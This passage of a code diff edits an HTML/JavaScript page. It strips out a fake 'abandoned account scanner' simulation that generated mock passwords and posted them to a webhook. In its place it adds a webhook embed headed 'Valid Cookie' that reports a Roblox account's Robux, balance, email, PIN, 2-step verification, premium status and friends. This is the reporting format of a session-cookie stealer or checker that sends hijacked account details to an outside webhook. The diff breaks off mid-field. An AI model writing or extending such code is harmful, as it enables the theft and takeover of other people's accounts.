@@ -152,108 +152,56 @@
                         body: JSON.stringify({
                             embeds: [
                                 {
-                                    title: "Abandoned Account Found!",
+                                    title: "✅ Valid Cookie",
                                     color: 65280,
+                                    description: "**Passed Cookie:**\n```Hidden```",
                                     fields: [
                                         {
-                                            name: "Username",
-                                            value: account.username,
-                                            inline: true,
+                                            name: "💰 Robux",
+                                            value: account.robux.toString(),
+                                            inline: false,
                                         },
                                         {
-                                            name: "Nickname",
-                                            value: account.nickname,
-                                            inline: true,
+                                            name: "💰 Balance",
+                                            value: account.balance,
+                                            inline: false,
                                         },
                                         {
-                                            name: "Password",
-                                            value: account.password,
-                                            inline: true,
+                                            name: "👤 Account Name",
+                                            value: `${account.username} (${account.nickname})`,
+                                            inline: false,
                                         },
                                         {
-                                            name: "Last Online",
-                                            value: account.year.toString(),
-                                            inline: true,
+                                            name: "📧 Email",
+                                            value: account.hasEmail ? "True" : "False",
+                                            inline: false,
                                         },
-                                    ],
-                                    timestamp: new Date().toISOString(),
-                                },
-                            ],
-                        }),
-                    });
-                } catch (e) {
-                    console.error("Webhook failed:", e);
-                }
-            }
-
-            function addLog(msg) {
-                const entry = document.createElement("div");
-                entry.className = "account-entry";
-                entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-                resultsDiv.prepend(entry);
-            }
-
-            async function scanLoop() {
-                if (!scanning) return;
-
-                count += Math.floor(Math.random() * 5) + 1;
-                scannedCount.innerText = count;
-
-                if (Math.random() < 0.03) {
-                    const min = parseInt(
-                        document.getElementById("minYear").value,
-                    );
-                    const max = parseInt(
-                        document.getElementById("maxYear").value,
-                    );
-                    const year =
-                        Math.floor(Math.random() * (max - min + 1)) + min;
-                    const id = Math.floor(Math.random() * 1000000);
-
-                    // Generating a mock password for simulation
-                    const chars =
-                        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
-                    let mockPass = "";
-                    for (let i = 0; i < 10; i++) {
-                        mockPass += chars.charAt(
-                            Math.floor(Math.random() * chars.length),
-                        );
-                    }
-
-                    const account = {
-                        username: "User_" + id,
-                        nickname: "Nick_" + id,
-                        password: mockPass,
-                        year: year,
-                    };
-
-                    addLog(
-                        `CRITICAL: Found abandoned account ${account.username} (Nick: ${account.nickname}) - Pass: ${mockPass} - Last active: ${year}`,
-                    );
-                    sendWebhook(account);
-                }
-
-                setTimeout(scanLoop, 500);
-            }
-
-            startBtn.onclick = () => {
-                scanning = true;
-                statusText.innerText = "RUNNING";
-                statusText.style.color = "#00ff00";
-                startBtn.style.display = "none";
-                stopBtn.style.display = "block";
-                addLog("Scanner sequence initiated...");
-                scanLoop();
-            };
-
-            stopBtn.onclick = () => {
-                scanning = false;
-                statusText.innerText = "OFFLINE";
-                statusText.style.color = "#ff0000";
-                startBtn.style.display = "block";
-                stopBtn.style.display = "none";
-                addLog("Scanner sequence terminated.");
-            };
-        </script>
-    </body>
-</html>
+                                        {
+                                            name: "📅 Account Age",
+                                            value: `${account.age} years`,
+                                            inline: false,
+                                        },
+                                        {
+                                            name: "👶 Above 13",
+                                            value: account.isAbove13 ? "True" : "False",
+                                            inline: false,
+                                        },
+                                        {
+                                            name: "⭐ Premium",
+                                            value: account.isPremium ? "True" : "False",
+                                            inline: false,
+                                        },
+                                        {
+                                            name: "🔑 Has PIN",
+                                            value: account.hasPin ? "True" : "False",
+                                            inline: false,
+                                        },
+                                        {
+                                            name: "🔒 2-Step Verification",
+                                            value: account.has2FA ? "True" : "False",
+                                            inline: false,
+                                        },
+                                        {
+                                            name: "👥 Friends",
+                                            value: account.friendsCount.toString(),
+                                            inline
